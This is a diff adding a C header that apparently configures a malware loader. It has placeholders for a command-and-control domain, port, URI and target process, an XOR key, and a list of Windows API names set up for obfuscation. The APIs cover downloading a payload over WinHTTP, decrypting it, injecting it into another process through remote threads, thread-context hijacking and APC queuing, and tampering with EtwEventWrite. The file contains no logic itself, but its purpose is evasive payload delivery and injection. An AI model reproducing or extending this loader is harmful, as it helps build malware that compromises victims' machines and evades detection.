@@ -1,0 +1,70 @@
+ #pragma once
+
+bool isHttps = <ISHTTPS>;
+int port = <PORT>;
+
+
+wchar_t wsKernel32DLL[]= L"KERNEL32.DLL";
+
+// TO XOR
+// add space at the end of string to give space to '\0'
+
+char XorKey[] = "xorkey";
+
+char sInjectionProcess[] = "<PROCESS>";
+char sDomain[] = "<DOMAIN>";
+char sUri[] = "<URL>";
+
+char sWinhttpDLL[] = "winhttp.dll ";
+
+char sWinHttpOpen[]      = "WinHttpOpen ";
+char sWinHttpConnect[]    = "WinHttpConnect ";
+char sWinHttpOpenRequest[]         = "WinHttpOpenRequest ";
+char sWinHttpSetOption[]         = "WinHttpSetOption ";
+char sWinHttpSendRequest[]         = "WinHttpSendRequest ";
+char sWinHttpReceiveResponse[]         = "WinHttpReceiveResponse ";
+char sWinHttpQueryHeaders[]         = "WinHttpQueryHeaders ";
+char sWinHttpQueryDataAvailable[]         = "WinHttpQueryDataAvailable ";
+char sWinHttpReadData[]         = "WinHttpReadData ";
+char sWinHttpCloseHandle[]         = "WinHttpCloseHandle ";
+
+char sKernel32DLL[] = "kernel32.dll ";
+
+char sGetProcAddress[]      = "GetProcAddress ";
+char sGetModuleHandleA[]    = "GetModuleHandleA ";
+char sOpenProcess[]         = "OpenProcess ";
+char sVirtualAlloc[]        = "VirtualAlloc ";
+char sVirtualFree[]         = "VirtualFree ";
+char sVirtualAllocEx[]      = "VirtualAllocEx ";
+char sWriteProcessMemory[]  = "WriteProcessMemory ";
+char sCreateRemoteThread[]  = "CreateRemoteThread ";
+char sLoadLibraryA[]        = "LoadLibraryA ";
+char sCloseHandle[]         = "CloseHandle ";
+char sWaitForSingleObject[] = "WaitForSingleObject ";
+
+char sCryptAcquireContextW[] = "CryptAcquireContextW ";
+char sCryptCreateHash[]      = "CryptCreateHash ";
+char sCryptHashData[]        = "CryptHashData ";
+char sCryptDeriveKey[]       = "CryptDeriveKey ";
+char sCryptDecrypt[]         = "CryptDecrypt ";
+char sCryptReleaseContext[]  = "CryptReleaseContext ";
+char sCryptDestroyHash[]     = "CryptDestroyHash ";
+char sCryptDestroyKey[]      = "CryptDestroyKey ";
+
+char sCreateToolhelp32Snapshot[] = "CreateToolhelp32Snapshot ";
+char sProcess32First[] = "Process32First ";
+char sProcess32Next[]  = "Process32Next ";
+
+char sOpenThread[] = "OpenThread ";
+char sSuspendThread[] = "SuspendThread ";
+char sResumeThread[] = "ResumeThread ";
+char sGetThreadContext[] = "GetThreadContext ";
+char sSetThreadContext[] = "SetThreadContext ";
+char sThread32Next[] = "Thread32Next ";
+
+char sCreateProcessA[] = "CreateProcessA ";
+char sQueueUserAPC[] = "QueueUserAPC ";
+
+char sNtdllDLL[] = "ntdll.dll ";
+char sEtwEventWrite[] = "EtwEventWrite ";
+
